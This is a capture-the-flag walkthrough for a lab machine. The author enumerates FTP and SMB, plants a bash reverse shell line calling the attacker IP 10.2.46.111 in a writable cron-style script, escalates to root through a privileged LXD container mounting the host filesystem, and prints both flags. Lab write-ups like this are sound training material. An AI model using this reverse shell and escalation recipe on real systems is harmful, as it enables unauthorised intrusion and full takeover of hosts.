# IP
```
10.10.232.97
```

# Enumerate the machine.  How many ports are open?

I scan the IP with nmap:
`sudo nmap -sSV 10.10.232.97 -T4`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 17:29 CET
Nmap scan report for 10.10.232.97
Host is up (0.34s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

There are 4 open ports

# What service is running on port 21?
`ftp`

# What service is running on ports 139 and 445?

It is Samba so the answer will be `smb`

# There's a share on the user's computer.  What's it called?

I used `enum4linux`, you may download it here `https://github.com/cddmp/enum4linux-ng`

It is also preinstalled on Kali

`python3 enum4linux-ng.py -As 10.10.232.97`

gives

```
======================================
|    Shares via RPC on 10.10.232.97    |
 ======================================
[*] Enumerating shares
[+] Found 3 share(s):
IPC$:
  comment: IPC Service (anonymous server (Samba, Ubuntu))
  type: IPC
pics:
  comment: My SMB Share Directory for Pics
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
```

Correct answer is `pics`

There are two files with puppies and in the beginning I thought it is a stegno challenge but arrived to a dead end.

=====================

Two last questions demand finding user.txt and root.txt.
As I do not find any access or files on Samba, my idea was to access ftp server so:

- `ftp $IP` and username `anonymous` gives me an access to ftp server. 
- I type `ls -al` and see there is a directory `scripts` with 3 files inside, so I download all of them

```
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2881 Dec 10 17:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

A script `clean.sh` removes files in /tmp/ directory and writes a date to .log file. Otherwise, it writes an information there is nothing to delete. This looks like a way to get a reverse shell somehow.

After some googling I find and add a bash line to the script which finally looks like this:

```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
	bash -i >& /dev/tcp/10.2.46.111/4444 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

Afterwards, I firstly run a netcat listener `nc -lvnp 4444` and access ftp once again. There is an option to `append` a script so I type:

append, then choose clean.sh and once again clean.sh.

Once done, I get a shell in another window as netcat catches execution of a script.

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.232.97 35724
bash: cannot set terminal process group (1558): Inappropriate ioctl for device
bash: no job control in this shell
```

I list all files which gives me `user.txt` file and first flag:

```
namelessone@anonymous:~$ ls -al
ls -al
total 60
drwxr-xr-x 6 namelessone namelessone 4096 May 14  2020 .
drwxr-xr-x 3 root        root        4096 May 11  2020 ..
lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo
-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts

```

```
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$ 
```

# What is the root.txt

This is a very vast stage.
- I used linpeas (to find any priviledge escalation)
- I realized we can get root by exploiting LXD containers as user `namelessone` is in sudo group.
- We need to build an alpine lxd container and then copy it to a vulnerable machine
https://github.com/saghul/lxd-alpine-builder

 `sudo ./build-alpine -a i686` to get a 32 bit container

 - Once contaner is done I run a python server on my machine `python3 -m http.server 8000`

 and then download created container by typing:
 `wget 10.2.46.111:8000/alpine-v3.12-i686-20201210_1850.tar.gz
`
on attacked machine

- `lxc image import alpine-v3.12-i686-20201210_1850.tar.gz --alias alpine`

which creates a container so `lxc image list` shows it

- `lxc init 628ad6314b9a privesc -c security.privileged=true`
creates a container (it is possible to type alpine instead of fingerprint)

- I list the container:

`lxc list`

```
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
```

- We add a hard disk to container
`lxc config device add privesc host-root disk source=/ path=/mnt/root
`

- Then we start a container and become root
```
namelessone@anonymous:~$ lxc start privesc  
lxc start privesc
namelessone@anonymous:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
whoami
root
```

and finally get the flag

```
cd /mnt/root/root
cat root.txt
4d930091c31a622a7ed10f27999af363
```


